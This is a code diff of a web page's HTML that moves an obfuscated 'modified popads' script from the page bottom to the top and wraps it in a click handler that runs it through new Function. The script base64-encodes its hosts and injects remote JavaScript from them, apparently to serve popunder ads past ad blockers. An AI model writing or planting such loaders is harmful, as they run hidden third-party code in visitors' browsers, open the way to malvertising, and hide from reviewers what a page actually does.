@@ -79,6 +79,57 @@
 </head>
 
 <body class="is-preload">
+	<!-- modified popads -->
+	<!-- Delayed script block -->
+  <script type="text/plain" id="delayed-script">
+    (function(){
+      var d = window,
+          e = "a6cc6a042117f137e61e6b184fbef681",
+          f = [["siteId",586-228+664+5187547],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],
+          o = ["d3d3LmJsb2NrYWRzbm90LmNvbS94bW9kYWFsLm1pbi5jc3M=","ZG5oZmk1bm4yZHQ2Ny5jbG91ZGZyb250Lm5ldC90VkZJSi9waW5wdXQtYXV0b2dyb3cubWluLmpz"],
+          j = -1, x, n;
+
+      var m = function(){
+        clearTimeout(n);
+        j++;
+        if(o[j] &amp;&amp; !(1769671250000 &lt; (new Date).getTime() &amp;&amp; 1 &lt; j)){
+          x = d.document.createElement("script");
+          x.type = "text/javascript";
+          x.async = true;
+          var v = d.document.getElementsByTagName("script")[0];
+          x.src = "https://" + atob(o[j]);
+          x.crossOrigin = "anonymous";
+          x.onerror = m;
+          x.onload = function(){
+            clearTimeout(n);
+            d[e.slice(0,16)+e.slice(0,16)] || m();
+          };
+          n = setTimeout(m, 5000);
+          v.parentNode.insertBefore(x, v);
+        }
+      };
+
+      if(!d[e]){
+        try {
+          Object.freeze(d[e] = f);
+        } catch(err) {}
+        m();
+      }
+    })();
+  </script>
+
+  <!-- Script that activates it on click -->
+  <script>
+    document.addEventListener("click", function runOnce() {
+      const code = document.getElementById("delayed-script").textContent;
+      try {
+        new Function(code)();
+      } catch (err) {
+        console.error("Script execution failed:", err);
+      }
+      document.removeEventListener("click", runOnce);
+    });
+  </script>
 
 	
 
@@ -241,45 +292,6 @@
 	<script src="js/breakpoints.min.js"></script>
 	<script src="js/util.js"></script>
 	<script src="js/main.js"></script>
-
-	<!-- modified popads -->
-	<!-- This part stores the actual script as a string (doesn't auto-execute) -->
-<script type="text/plain" id="delayed-script">
-(function(){
-  var d = window,
-      e = "a6cc6a042117f137e61e6b184fbef681",
-      f = [["siteId",586-228+664+5187547],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],
-      o = ["d3d3LmJsb2NrYWRzbm90LmNvbS94bW9kYWFsLm1pbi5jc3M=","ZG5oZmk1bm4yZHQ2Ny5jbG91ZGZyb250Lm5ldC90VkZJSi9waW5wdXQtYXV0b2dyb3cubWluLmpz"],
-      j = -1, x, n;
-
-  var m = function(){
-    clearTimeout(n);
-    j++;
-    if(o[j] && !(1769671250000 < (new Date).getTime() && 1 < j)){
-      x = d.document.createElement("script");
-      x.type = "text/javascript";
-      x.async = true;
-      var v = d.document.getElementsByTagName("script")[0];
-      x.src = "https://" + atob(o[j]);
-      x.crossOrigin = "anonymous";
-      x.onerror = m;
-      x.onload = function(){
-        clearTimeout(n);
-        d[e.slice(0,16)+e.slice(0,16)] || m();
-      };
-      n = setTimeout(m, 5000);
-      v.parentNode.insertBefore(x, v);
-    }
-  };
-
-  if(!d[e]){
-    try {
-      Object.freeze(d[e] = f);
-    } catch(err) {}
-    m();
-  }
-})();
-</script>
 
 </body>
 
